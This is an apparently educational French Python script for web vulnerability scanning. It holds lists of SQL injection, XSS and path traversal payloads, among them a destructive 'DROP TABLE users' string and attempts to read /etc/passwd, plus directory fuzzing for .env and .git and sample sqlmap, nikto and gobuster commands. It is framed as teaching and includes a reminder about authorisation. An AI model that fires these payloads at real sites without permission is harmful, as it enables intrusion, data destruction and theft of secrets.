#!/usr/bin/env python3
"""
SÉCURITÉ WEB — Tests des vulnérabilités OWASP Top 10
Techniques: SQLi, XSS, IDOR, Path Traversal, Headers analysis
"""

import re
import urllib.parse
import urllib.request
import urllib.error
import http.client

# ─────────────────────────────────────────────────
# 1. ANALYSE DES EN-TÊTES HTTP — Sécurité de base
# ─────────────────────────────────────────────────
HEADERS_SECURITE = {
    "Strict-Transport-Security": "Force HTTPS (HSTS)",
    "Content-Security-Policy": "Prévient XSS",
    "X-Frame-Options": "Prévient Clickjacking",
    "X-Content-Type-Options": "Prévient MIME sniffing",
    "Referrer-Policy": "Contrôle les infos de référence",
    "Permissions-Policy": "Contrôle les APIs du navigateur",
    "X-XSS-Protection": "Protection XSS legacy",
}

def analyser_headers(url: str) -> dict:
    """Analyse les en-têtes HTTP de sécurité d'un site."""
    print(f"\n[*] Analyse des headers: {url}")
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "SecurityScanner/1.0"})
        with urllib.request.urlopen(req, timeout=10) as resp:
            headers = dict(resp.headers)
    except Exception as e:
        print(f"  [!] Erreur: {e}")
        return {}

    resultats = {}
    for header, description in HEADERS_SECURITE.items():
        valeur = headers.get(header, headers.get(header.lower()))
        if valeur:
            print(f"  [+] {header}: {valeur[:60]}")
            resultats[header] = {"present": True, "valeur": valeur}
        else:
            print(f"  [-] MANQUANT: {header} ({description})")
            resultats[header] = {"present": False}

    # Infos supplémentaires
    serveur = headers.get("Server", "Non divulgué")
    print(f"\n  [i] Serveur: {serveur}")
    if serveur != "Non divulgué":
        print(f"  [!] ATTENTION: Le serveur révèle sa version — risque d'info disclosure")

    return resultats


# ─────────────────────────────────────────────────
# 2. DÉTECTION SQL INJECTION — OWASP A03
# ─────────────────────────────────────────────────
PAYLOADS_SQLI = [
    "'",                          # Erreur SQL basique
    "' OR '1'='1",               # Auth bypass
    "' OR '1'='1' --",           # Commentaire SQL
    "1; DROP TABLE users --",    # Destructif (tester JAMAIS en prod)
    "' UNION SELECT NULL --",    # UNION-based
    "1' AND SLEEP(5) --",        # Blind time-based
    "' AND 1=1 --",              # Boolean-based
    "admin'--",                  # Admin bypass
]

def tester_sqli(url_base: str, parametre: str) -> list[str]:
    """
    Teste les injections SQL sur un paramètre GET.
    Exemple: tester_sqli("http://site.com/page?id=1", "id")
    """
    vulns = []
    erreurs_sql = [
        "mysql_fetch", "ORA-", "Microsoft OLE DB", "ODBC",
        "SQLite", "PostgreSQL", "syntax error", "mysql_num_rows",
        "mysql error", "Warning: mysql"
    ]

    print(f"\n[*] Test SQLi sur: {url_base} (param: {parametre})")

    for payload in PAYLOADS_SQLI:
        params = urllib.parse.parse_qs(urllib.parse.urlparse(url_base).query)
        params[parametre] = [payload]
        query = urllib.parse.urlencode(params, doseq=True)
        url_test = f"{url_base.split('?')[0]}?{query}"

        try:
            req = urllib.request.Request(url_test, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                contenu = resp.read().decode(errors="ignore")

            for erreur in erreurs_sql:
                if erreur.lower() in contenu.lower():
                    print(f"  [VULN] Payload: {payload!r} → erreur SQL détectée: '{erreur}'")
                    vulns.append(payload)
                    break
        except urllib.error.HTTPError as e:
            if e.code == 500:
                print(f"  [VULN?] Payload: {payload!r} → Erreur 500 (peut indiquer SQLi)")
        except Exception:
            pass

    if not vulns:
        print("  [OK] Aucune vulnérabilité SQLi évidente détectée")
    return vulns


# ─────────────────────────────────────────────────
# 3. DÉTECTION XSS — OWASP A03
# ─────────────────────────────────────────────────
PAYLOADS_XSS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg onload=alert('XSS')>",
    "'><script>alert(1)</script>",
    "<ScRiPt>alert('XSS')</ScRiPt>",  # Bypass majuscules
    "%3Cscript%3Ealert('XSS')%3C/script%3E",  # URL encoded
]

def tester_xss(url_base: str, parametre: str) -> list[str]:
    """Teste les vulnérabilités XSS réfléchi."""
    vulns = []
    print(f"\n[*] Test XSS sur: {url_base} (param: {parametre})")

    for payload in PAYLOADS_XSS:
        params = {parametre: payload}
        query = urllib.parse.urlencode(params)
        url_test = f"{url_base.split('?')[0]}?{query}"

        try:
            req = urllib.request.Request(url_test, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                contenu = resp.read().decode(errors="ignore")

            if payload in contenu:
                print(f"  [VULN] XSS réfléchi! Payload non encodé retrouvé dans la réponse")
                vulns.append(payload)
        except Exception:
            pass

    if not vulns:
        print("  [OK] Aucun XSS réfléchi évident détecté")
    return vulns


# ─────────────────────────────────────────────────
# 4. PATH TRAVERSAL — OWASP A01
# ─────────────────────────────────────────────────
PAYLOADS_TRAVERSAL = [
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",       # URL encoded
    "....//....//....//etc/passwd",        # Double slash bypass
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd", # Double encoding
]

def tester_path_traversal(url_base: str, parametre: str) -> list[str]:
    """Teste les vulnérabilités Path Traversal."""
    vulns = []
    indice_passwd = "root:x:0:0"  # Contenu attendu de /etc/passwd
    print(f"\n[*] Test Path Traversal sur: {url_base}")

    for payload in PAYLOADS_TRAVERSAL:
        params = {parametre: payload}
        query = urllib.parse.urlencode(params)
        url_test = f"{url_base.split('?')[0]}?{query}"

        try:
            req = urllib.request.Request(url_test, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                contenu = resp.read().decode(errors="ignore")

            if indice_passwd in contenu:
                print(f"  [VULN] Path Traversal! /etc/passwd lu avec: {payload}")
                vulns.append(payload)
        except Exception:
            pass

    return vulns


# ─────────────────────────────────────────────────
# 5. FUZZING DE RÉPERTOIRES — Découverte de contenu caché
# ─────────────────────────────────────────────────
WORDLIST_DIRS = [
    "admin", "login", "dashboard", "api", "backup", "config",
    ".git", ".env", "wp-admin", "phpinfo.php", "robots.txt",
    "sitemap.xml", "swagger", "api/v1", "console", "shell",
    "upload", "uploads", "files", "data", "db", "database",
]

def fuzzer_repertoires(url_base: str) -> list[str]:
    """Découvre les répertoires et fichiers cachés."""
    trouves = []
    url_base = url_base.rstrip("/")
    print(f"\n[*] Fuzzing de répertoires: {url_base}")

    for chemin in WORDLIST_DIRS:
        url = f"{url_base}/{chemin}"
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=3) as resp:
                code = resp.status
                taille = len(resp.read())
                print(f"  [{code}] {url} ({taille} bytes)")
                trouves.append(url)
        except urllib.error.HTTPError as e:
            if e.code not in [404, 403]:
                print(f"  [{e.code}] {url}")
        except Exception:
            pass

    return trouves


# ─────────────────────────────────────────────────
# DÉMONSTRATION
# ─────────────────────────────────────────────────
if __name__ == "__main__":
    print("=" * 60)
    print("  SÉCURITÉ WEB — Guide Ingénieur Cybersécurité")
    print("=" * 60)

    print("\n[EXEMPLE] Analyse des headers HTTP:")
    analyser_headers("http://example.com")

    print("\n\n[RAPPEL LÉGAL]")
    print("  Ne testez JAMAIS ces techniques sans autorisation écrite.")
    print("  Utilisez des environnements de lab: DVWA, WebGoat, HackTheBox.")
    print("\n[OUTILS PROS]")
    print("  burpsuite  — Proxy d'interception web")
    print("  sqlmap     — Exploitation SQLi automatique: sqlmap -u 'URL' --dbs")
    print("  nikto      — Scanner de vulnérabilités web: nikto -h URL")
    print("  gobuster   — Fuzzing de dirs: gobuster dir -u URL -w wordlist.txt")
